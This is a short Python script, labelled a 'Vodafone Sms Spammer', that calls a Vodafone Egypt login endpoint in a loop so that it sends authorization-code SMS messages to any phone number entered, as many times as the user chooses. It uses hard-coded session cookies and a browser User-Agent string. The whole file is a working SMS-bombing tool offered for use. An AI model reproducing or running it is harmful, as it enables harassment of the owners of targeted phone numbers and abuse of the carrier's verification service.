import requests
import time

print("""
                              Vodafone Sms Spammer
                          Coded By: Mostafa M. Mead                                                                 
""")

x = 0

def spam(phone , count):
    global x
    url = "https://cloudportal.vodafone.com.eg/portal/login/sendauthorizationcode?mobileNumber={}".format(phone)
    headers = {
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Host':'cloudportal.vodafone.com.eg',
        'Cookie':'s_ecid=MCMID%7C74680281525677510289134564086491548847; s_fid=66A2E9E6D6C1087A-12D511ACF0ACFD2F; AMCV_C6AA02BE532E6B0F0A490D4C%40AdobeOrg=2096510701%7CMCIDTS%7C18132%7CMCMID%7C74680281525677510289134564086491548847%7CvVersion%7C2.0.0%7CMCAID%7CNONE%7CMCOPTOUT-1566590055s%7CNONE; s_vnum=1567288800286%26vn%3D2; s_nr=1566584097842-Repeat; sc_c15=1566584097844; utag_main=v_id:016cbc41eca8003679f71014355603073004906b00978$_sn:2$_ss:0$_st:1566587010267$vapi_domain:vodafone.com.eg$ses_id:1566582856016%3Bexp-session$_pn:7%3Bexp-session; GUEST_LANGUAGE_ID=ar_SA; dtCookie=1$B1FBCC9435127ABBB173AEF05092E6EC; TS01f81625=01722e334e77167380277f070bc4c47217d0ad93e62c21ac1dd4a69a4356063a0adba008f47ebd1a3b092071945169448e3881d6f7b42b38dca31ccdd4b5197cc0e514b6333b6393bd32ae37c8426464f38d72c925; JSESSIONID=BkRydhwf5n0v1X251xJf51HnswXvGC2J0Lpm531Ndd52QlSFGNQv!126349259!1566699647388; TS018b52ca=01722e334ea4ae8d402b36c73ed3b24740fde77948d50035be4fce273663c30fdfcd0434f64ddb34fa4cd9d984270a3da9e35fe5792aa40e22e8e81478ec01ff00fbdf2498',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
    }
    for x in range(count):
        try:
            req = requests.get(url , headers=headers)
        except Exception as e:
            print(e)
            pass
        else:
            x += 1
            print("[{}] Spammed On {}".format(x , phone))

def main():
    phone = input("[+] Enter Your Phone Number: ")
    count = int(input("[+] How Many Sms You Would Send: "))
    spam(phone, count)

if __name__ == "__main__":
    main()
    input("[+] Completed")